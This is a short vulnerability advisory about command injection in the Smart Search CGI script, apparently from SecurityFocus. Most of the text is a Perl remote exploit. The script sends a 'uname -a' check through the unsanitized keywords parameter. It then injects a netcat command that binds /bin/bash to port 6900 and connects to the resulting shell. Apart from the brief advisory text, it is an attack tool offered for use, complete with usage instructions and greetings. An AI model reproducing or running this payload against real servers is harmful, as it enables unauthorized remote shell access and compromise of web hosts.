source: http://www.securityfocus.com/bid/7133/info

A vulnerability has been discovered in the Smart Search CGI script. Due to insufficient sanitization of user-supplied URI parameters, it may be possible for an attacker to execute arbitrary commands on a target system. All commands executed in this manner would be run with the privileges of the web server hosting the script.

#!/usr/bin/perl -w
#
# Smart Search CGI Remote Exploit by: Knight420
#
# Greetz: echo, qubit, lkm, omega, borgon
#
use IO::Socket;
if ($#ARGV<0)
{
print "\nSmart Search CGI Remote Exploit by: Knight420";
print "\n\n Usage: perl smartass.pl ip path\n\n";
exit;
}
$elite = ("GET 
$ARGV[1]smartsearch.cgi?keywords=|nc%20-vv%20-l%20-p%206900%20-t%20-e%20/bin/bash| 
HTTP/1.0");
$check = ("GET $ARGV[1]smartsearch.cgi?keywords=|uname%20-a| HTTP/1.0");
$connect = IO::Socket::INET ->new (Proto=>"tcp", PeerAddr=> "$ARGV[0]", 
PeerPort=>"80"); unless ($connect) { die "Cannot connect to host $ARGV[0]" }
system('clear ');
print "Smart Search CGI Remote Exploit by: knight420";
print "\n*** [1] Checking if remote host is vulnerable...";
print $connect "$check";
if ($#connect<0)
{
print "\n*** [*] Remote host is not vulnerable... \n";
exit;
}
print "\n *** [2] Host is vulnerable...Sending exploit code";
print $connect "$elite";
system('nc -v $ARGV[0] 6900 ');
close($connect);
